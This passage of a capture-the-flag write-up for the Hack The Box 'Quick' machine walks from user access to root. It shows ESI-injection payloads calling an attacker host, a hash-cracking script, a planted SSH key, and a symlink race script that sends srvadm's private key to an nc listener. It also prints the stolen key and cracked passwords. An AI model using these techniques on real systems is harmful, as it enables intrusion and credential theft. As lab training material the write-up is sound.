drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-servlet
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-war
```

I began combing through the Esigate files, since that's what gave me access, but found nothing useful there.

```text
sam@quick:~/esigate-distribution-5.2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sam:x:1000:1000:sam:/home/sam:/bin/bash
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
srvadm:x:1001:1001:,,,:/home/srvadm:/bin/bash
```

I dumped `/etc/passwd` to see which users and services existed, and found three accounts with login shells: `root`, `sam`, and `srvadm`.  

```text
sam@quick:~/esigate-distribution-5.2$ netstat -tulvnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:32985         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::9001                 :::*                    LISTEN      926/java            
tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN      926/java            
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp6       0      0 :::443                  :::*                                -                   
sam@quick:~/esigate-distribution-5.2$ nc 127.0.0.1 8081

whoami
HTTP/1.1 400 No URI
Content-Length: 0
Connection: close
Server: Jetty(9.1.z-SNAPSHOT)
```

Netstat revealed a few extra internally listening ports that I couldn't hit from my machine. Port 8081 was running a Jetty server, version 9.1.z-SNAPSHOT, and I tracked down vulnerabilities for it at [https://www.cvedetails.com/vulnerability-list/vendor\_id-10410/product\_id-34824/Eclipse-Jetty.html](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html), but none of them panned out. 

```text
root       1173  0.0  1.0 1034316 42320 ?       Ssl  15:33   0:01 /usr/bin/containerd
root       1175  0.0  2.1 1273752 86712 ?       Ssl  15:33   0:02 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root       1223  0.0  0.0  14888  1992 tty1     Ss+  15:33   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       1224  0.0  0.1 288884  6648 ?        Ssl  15:33   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       1266  0.0  0.1  72300  5768 ?        Ss   15:33   0:00 /usr/sbin/sshd -D
root       1378  0.0  0.5 376244 22876 ?        Ss   15:33   0:00 /usr/sbin/apache2 -k start
root       1925  0.0  0.0 478532  3644 ?        Sl   15:33   0:00 /usr/bin/docker-proxy -proto udp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.18.0.2 -container-port 443
root       1936  0.0  0.1   9364  5496 ?        Sl   15:33   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/d63025c3f05b572471c86c790059b05f36c75fc90d975cb19288d5bc88d238ee -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root       1937  0.0  0.1   9364  5832 ?        Sl   15:33   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/f78e2c79d2db3e029679c14060e7dcab4ffbba2167c107a7677f81024e8bc875 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-run
```

A fair number of container-related processes were running...in fact, the UDP 443 port I'd connected to appeared to be served from a container. There was even an interface for it visible in `ifconfig`.  

```text
docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:f4:06:67:00 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
```

I attempted to connect to the docker container at that IP, but was turned away for lack of credentials.  

![](assets/wu/quick/img-15.png)

Next I dug through the website files in `/var/www` looking for stray credentials, and turned up the email address `srvadm@quick.htb` inside `index.php`.  That file also referenced `db.php`, which sounded like it could hold something useful.

```php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
```

It didn't disappoint.  I now had credentials for the MySQL database I'd seen listening on port 3306 earlier.  

![](assets/wu/quick/img-16.png)

Within `/var/www/` I spotted a writable `jobs` folder owned by root.  That's always a promising sign of a privilege escalation path.   In `/var/www/printers` I also came across `job.php`, which looked interesting. 

```php
sam@quick:/var/www/printer$ cat job.php
<?php
require __DIR__ . '/escpos-php/vendor/autoload.php';
use Mike42\Escpos\PrintConnectors\NetworkPrintConnector;
use Mike42\Escpos\Printer;
include("db.php");
session_start();

if($_SESSION["loggedin"])
{
        if(isset($_POST["submit"]))
        {
                $title=$_POST["title"];
                $file = date("Y-m-d_H:i:s");
                file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
                chmod("/var/www/printer/jobs/".$file,"0777");
                $stmt=$conn->prepare("select ip,port from jobs");
                $stmt->execute();
                $result=$stmt->get_result();
                if($result->num_rows > 0)
                {
                        $row=$result->fetch_assoc();
                        $ip=$row["ip"];
                        $port=$row["port"];
                        try
                        {
                                $connector = new NetworkPrintConnector($ip,$port);
                                sleep(0.5); //Buffer for socket check
                                $printer = new Printer($connector);
                                $printer -> text(file_get_contents("/var/www/jobs/".$file));
                                $printer -> cut();
                                $printer -> close();
                                $message="Job assigned";
                                unlink("/var/www/jobs/".$file);
                        }
                        catch(Exception $error) 
                        {
                                $error="Can't connect to printer.";
                                unlink("/var/www/jobs/".$file);
                        }
                }
                else
                {
                        $error="Couldn't find printer.";
                }
        }
```

This suggested I could drop a file in the `/jobs` folder \(where I had write access\), put my IP and port in it, and `jobs.php` would then connect back to my machine believing it was sending a print job. The catch is that whoever triggers the print has to be logged in. That made me want to check the database for additional credentials.

```sql
sam@quick:/var/www/html$ mysql -u db_adm -p quick
Enter password: 
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 71
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)
```

I located the users table, which possibly held new credentials, but I wasn't sure what hashing or encryption scheme had been applied to them.

```text
mysql> select * from tickets;
+----------+-----------+------------------------------------------------------------------------------------------------------------------------+--------+
| id       | title     | description                                                                                                            | status |
+----------+-----------+------------------------------------------------------------------------------------------------------------------------+--------+
| TKT-4178 | ping test | "<esi:include src="http://10.10.15.57:9088/evil98.xml" stylesheet="http://10.10.15.57:9088/evil98.xsl"></esi:include>" | open   |
| TKT-4567 | evil      | "<esi:include src="http://10.10.15.57:9088/evil.xml" stylesheet="http://10.10.15.57:9088/evil.xsl"></esi:include>"     | open   |
| TKT-0987 | evil      | "<esi:include src="http://10.10.15.57:9088/evil.xml" stylesheet="http://10.10.15.57:9088/evil.xsl"></esi:include>"     | open   |
| TKT-9876 | evil1     | "<esi:include src="http://10.10.15.57:9088/evil1.xml" stylesheet="http://10.10.15.57:9088/evil1.xsl"></esi:include>"   | open   |
| TKT-8765 | evil2     | "<esi:include src="http://10.10.15.57:9088/evil2.xml" stylesheet="http://10.10.15.57:9088/evil2.xsl"></esi:include>"   | open   |
+----------+-----------+------------------------------------------------------------------------------------------------------------------------+--------+
9 rows in set (0.00 sec)
```

I also found the list of tickets I'd submitted earlier...the lazy admin still hadn't gotten around to addressing my "issues"!

![](assets/wu/quick/img-17.png)

for the password "hash" I had recovered, login.php held this line that explained how it was built:

```text
$password = md5(crypt($password,'fa'));
```

wrote a script to crack the password, drawing on: [https://stackoverflow.com/questions/13246597/how-to-read-a-large-file-line-by-line](https://stackoverflow.com/questions/13246597/how-to-read-a-large-file-line-by-line)

```php
<?php
if ($wordlist = fopen("/home/kac0/rockyou_utf8.txt", "r")) {
    while ((!feof($wordlist))) {
    $pass = fgets($wordlist);
#    echo "Trying: " . $pass;

    $hash = "e626d51f8fbfd1124fdea88396c35d05";

        $ciphertext = MD5(crypt(trim($pass),'fa'));

        if ($hash == $ciphertext) {
          exit("The password is: " . $pass);
        }  
    }

    fclose($wordlist);

} else {
    exit("Failed to open the wordlist");
}
?>
```

then I ran it, and the result came back quickly

```text
kac0@kali:~/htb/quick$ php decrypt.php
The password is: yl51pbx
```

from github - [https://github.com/mike42/escpos-php](https://github.com/mike42/escpos-php)

```text
Some examples are below for common interfaces.

Communicate with a printer with an Ethernet interface using netcat:

php hello-world.php | nc 10.x.x.x. 9100
```

![](assets/wu/quick/img-18.png)

```text
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 127.0.0.1:80
```

While exploring the /etc/apache2 directory I noticed that `ports.conf` mentioned a listener on port 80. Since it wasn't exposed externally, it had to be an internal-only page. The file pointed to `/etc/apache2/sites-enabled/000-default.conf` for virtual hosts, so I looked there.

```text
</VirtualHost>
<VirtualHost *:80>
        AssignUserId srvadm srvadm
        ServerName printerv2.quick.htb
        DocumentRoot /var/www/printer
</VirtualHost>
```

There was the information I needed! A virtual host on port 80 at `printerv2.quick.htb` was running as the `srvadm` user. This might let me abuse that jobs folder I'd found in `/var/www/html`. 

![](assets/wu/quick/img-19.png)

I added the host to my `/etc/hosts` file, but I still couldn't reach the page because it lived on port 80 \(which remained closed to the outside\).

```text
sam@quick:/etc/apache2$ curl http://printerv2.quick.htb
curl: (6) Could not resolve host: printerv2.quick.htb
```

It turned out this domain name wasn't in the `quick.htb` box's own hosts file, so I tried connecting by IP and port instead.

```markup
sam@quick:/etc/apache2$ curl http://127.0.0.1:80
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Quick | Broadband Services</title>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'>
<style>
...CSS snipped...
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<section class="cover">
<nav>
<span class="logo">
Quick
</span>
<ul>
<li>About</li>
<li>Contact</li>
</ul>
</nav>
<div class="content">
<h2 class="heading">New Broadband Services in JetSpeed<br />for all your Need.</h2>
<p>Upto 17MBps - £18 | Upto 50MBps - £27</p>
<div class="cta-btn">
<a href="/login.php">Get Started</a>
</div>
<p class="highlight">30 day trial | No Bandwidth limit</p>
<div class="card">
<h2>Update!</h2>
<p>We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our <a href="https://portal.quick.htb">portal</a><br />
<br />You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App</p>
</div>
</div>
</section>
<center>
<br />
<table border="0" width="50%"><tr><th style="font-size:180%;" colspan="2">Testimonals!<br /><br /></th></tr>
<tr><td><br />Super fast services by Quick Broadband Services. I love their service.</td><td> --By Tim (Qconsulting Pvt Ltd)</td></tr>
<tr><td><br />Quick support and eligant chat response.</td><td> --By Roy (DarkWng Solutions)</td></tr>
<tr><td><br />I never regret using Quick services. Super fast wifi and no issues.</td><td> --By Elisa (Wink Media)</td></tr>
<tr><td><br />Very good delivery and support all these years.</td><td> --By James (LazyCoop Pvt Ltd)</td></tr></table>
<center><br /><br />Check our <a href="/clients.php">clients</a>
</body>
</html>
```

This page looks identical to the virtual-hosted `http://portal.quick.htb`. That's expected, though, since connecting properly requires specifying the virtual host's domain name. Editing the local hosts file would solve it, but since I couldn't, I'd have to connect from my own machine.

I decided to set up an authorized\_keys file for `sam` and see whether I could use SSH port forwarding to browse the printer page from my own browser.

```text
sam@quick:~/.ssh$echo 'ssh-rsa AAAA<my_public_key> kac0@kali' >> authorized_keys
```

SSH worked, so next I built my port-forwarding tunnel. The `-L` option forwards a local port to a port on the remote host using the syntax `-L local_socket:host:hostport`.

```text
kac0@kali:~/htb/quick$ ssh -L 40905:<YOUR_IP>:80 sam@quick.htb
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 16 18:31:26 UTC 2020

  System load:  0.06               Users logged in:                1
  Usage of /:   30.1% of 19.56GB   IP address for ens33:           <YOUR_IP>
  Memory usage: 23%                IP address for br-9ef1bb2e82cd: 172.18.0.1
  Swap usage:   0%                 IP address for docker0:         172.17.0.1
  Processes:    130

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

54 packages can be updated.
28 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Aug 16 18:30:27 2020 from 10.10.15.57
sam@quick:~$
```

I logged in fine; now to test the port forwarding in the browser. It didn't work at first, but I quickly saw why. I was forwarding to <YOUR_IP> on port 80, which I already knew was blocked from outside the `quick.htb` machine. I needed to reach the site the same way I had with curl, via `127.0.0.1:80`.

```text
kac0@kali:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
```

With the IP corrected, I could reach the virtual-hosted page. ![](assets/wu/quick/img-22.png)

This brought up a login page. Knowing the page ran as `srvadm`, I assumed the credentials were the ones I'd recovered for that user from the MySQL database earlier. [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

### Getting a shell

![](assets/wu/quick/img-23.png)

![](assets/wu/quick/img-24.png)

![](assets/wu/quick/img-25.png)

```text
kac0@kali:~/htb/quick$ nc -lvnp 9100
listening on [any] 9100 ...
connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 33998
kac0@kali:~/htb/quick$ nc -lvnp 9100
listening on [any] 9100 ...
connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 34158
This is a testVA
```

The moment I hit the print button I got a connection, but it dropped when I navigated to the jobs page. I reopened the listener and sent a test message, which showed up in my nc listener before the connection closed again. It seemed I wouldn't be able to push a shell through this; I'd have to exfiltrate data that `srvadm` could read.

```text
sam@quick:/home/srvadm$ ls -la
total 44
drwxr-xr-x 7 srvadm srvadm 4096 Aug 16 13:03 .
drwxr-xr-x 4 root   root   4096 Mar 20 02:16 ..
lrwxrwxrwx 1 srvadm srvadm    9 Mar 20 02:38 .bash_history -> /dev/null
-rw-r--r-- 1 srvadm srvadm  220 Mar 20 02:16 .bash_logout
-rw-r--r-- 1 srvadm srvadm 3771 Mar 20 02:16 .bashrc
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 .cache
drwxr-x--- 3 srvadm srvadm 4096 Aug 16 11:58 .config
drwx------ 4 srvadm srvadm 4096 Aug 16 12:07 .gnupg
-rw------- 1 srvadm srvadm   34 Aug 16 13:03 .lesshst
drwxrwxr-x 3 srvadm srvadm 4096 Mar 20 06:37 .local
-rw-r--r-- 1 srvadm srvadm  807 Mar 20 02:16 .profile
drwx------ 2 srvadm srvadm 4096 Mar 20 02:38 .ssh
```

this user did have a `.ssh` folder, so I was hoping for an `id_rsa` key I could try to steal. I searched for files `srvadm` could access but found nothing else of interest.

```text
$title=$_POST["title"];
                $file = date("Y-m-d_H:i:s");
                file_put_contents("/var/www/jobs/".$file,$_POST["desc"]);
                chmod("/var/www/printer/jobs/".$file,"0777");
                $stmt=$conn->prepare("select ip,port from jobs");
                $stmt->execute();
                $result=$stmt->get_result();
```

I went back to the jobs page code to understand exactly what it did. It appeared to create a file named from the php `date("Y-m-d_H:i:s")` function, then write into it the contents of the 'Bill Details' field from the 'Print Jobs' page. It then sends that file to the IP and port given in the 'Bill & Receipt Printer' field.

So...now I had to figure out how to trick this into printing `srvadm`'s SSH key. The only approach I could come up with was to swap the file the print job expects with a link to the key file \(possible because job.php sets the permissions to 0777\) before it gets sent to the "printer". I'd have to be...quick. [https://stackoverflow.com/questions/12198844/replace-a-whole-file-with-another-file-in-bash](https://stackoverflow.com/questions/12198844/replace-a-whole-file-with-another-file-in-bash)

```text
#!/bin/bash

while : 
do
        for job in $(ls -1 /var/www/jobs)
        do
                cat /dev/shm/printer > /var/www/jobs/$job;
        done
done
```

That didn't work...likely because I lacked read access to the file. Still, it confirmed the file exists and that I was on the right track!

```text
#!/bin/bash

while : 
do
        for job in $(ls -1 /var/www/jobs)
        do
                echo "The filename is $job"
                filename=$job
                rm -f /var/www/jobs/$job;
                ln -sf /home/srvadm/.ssh/id_rsa /var/www/jobs/$filename;
        done
done
```

This time, rather than copying the SSH key's contents into the print file, I replaced the print file with a symlink to the key. That way, when the file is dispatched to my waiting "printer" \(nc listener\), it would send the SSH key with `srvadm`'s permissions.

```text
kac0@kali:~/htb/quick$ nc -lvnp 9100
listening on [any] 9100 ...
connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 36404
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
```

After a lot of troubleshooting I landed on the script above and managed to retrieve the SSH key. I had to delete the print job file that `job.php` created, save its filename to a variable, and then symlink `id_rsa` to a file with that same name. All of this had to happen before the print job was sent to my waiting nc listener.

## Enumeration as `srvadm`

```text
kac0@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
load pubkey "srvadm.id_rsa": invalid format
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'srvadm.id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "srvadm.id_rsa": bad permissions
srvadm@quick.htb's password:
```

I'd forgotten to set the private key's permissions to 600

```text
kac0@kali:~/htb/quick$ chmod 600 srvadm.id_rsa 
kac0@kali:~/htb/quick$ ssh -i srvadm.id_rsa srvadm@quick.htb
load pubkey "srvadm.id_rsa": invalid format
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Aug 16 22:28:26 UTC 2020

  System load:  0.0                Users logged in:                1
  Usage of /:   30.1% of 19.56GB   IP address for ens33:           <YOUR_IP>
  Memory usage: 23%                IP address for br-9ef1bb2e82cd: 172.18.0.1
  Swap usage:   0%                 IP address for docker0:         172.17.0.1
  Processes:    134

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

54 packages can be updated.
28 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Aug 16 11:56:50 2020 from 10.10.14.110
srvadm@quick:~$ sudo -l
[sudo] password for srvadm:
```

![](assets/wu/quick/fix-24.png)

```text
srvadm@quick:~/.local/share/nano$cat search_history
2013
2011

2019
2018
```

```text
srvadm@quick:~/.local/share/nano$ id
uid=1001(srvadm) gid=1001(srvadm) groups=1001(srvadm),999(printers)
srvadm@quick:~/.local/share/nano$ find / -group printers 2>/dev/null
```

I noticed srvadm belonged to the `printers` group, so I hunted for files that group could access...and found nothing.

```text
srvadm@quick:~/.cache/conf.d$ netstat -lvn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:41151         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::9001                 :::*                    LISTEN     
tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp6       0      0 :::443                  :::*                               
raw6       0      0 :::58                   :::*                    7
```

```text
srvadm@quick:~/.cache/conf.d$ telnet 127.0.0.1  8081
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
ls
HTTP/1.1 400 No URI
Content-Length: 0
Connection: close
Server: Jetty(9.1.z-SNAPSHOT)

Connection closed by foreign host.
```

[https://www.cvedetails.com/cve/CVE-2017-7658/](https://www.cvedetails.com/cve/CVE-2017-7658/)

 [https://www.cvedetails.com/vulnerability-list/vendor\_id-10410/product\_id-34824/Eclipse-Jetty.html](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html)

 [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

![](assets/wu/quick/fix-25.png)

```text
srvadm@quick:~/.cache$ ls -la
total 20
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 .
drwxr-xr-x 6 srvadm srvadm 4096 Mar 20 06:37 ..
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 conf.d
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:46 logs
-rw-r--r-- 1 srvadm srvadm    0 Mar 20 02:38 motd.legal-displayed
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:18 packages
srvadm@quick:~/.cache$ cd conf.d/
srvadm@quick:~/.cache/conf.d$ ls -la
total 20
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 .
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 ..
-rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 cupsd.conf
-rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 printers.conf
srvadm@quick:~/.cache/conf.d$ vim printers.conf 
srvadm@quick:~/.cache/conf.d$ curl https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
curl: (6) Could not resolve host: printerv3.quick.htb
```

```text
first tunnel
kac0@kalimaa:~/htb/quick$ ssh -L 40905:<YOUR_IP>:443 -i srvadm.id_rsa srvadm@quick.htb
then
https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
decodes to 
https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer
```

`&ftQ4K3SGde8?` looked like it was serving as a password, so I tried it with sudo as `srvadm`, but that failed. On a whim I attempted to `su` to `root`...and it worked!

### Root.txt

```text
srvadm@quick:~/.cache/conf.d$ su root
Password: 
root@quick:/home/srvadm/.cache/conf.d# cd /root
root@quick:~# whoami && uname -a
root
Linux quick 4.15.0-91-generic #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
root@quick:~# cat root.txt 
d5d1************************256a
```
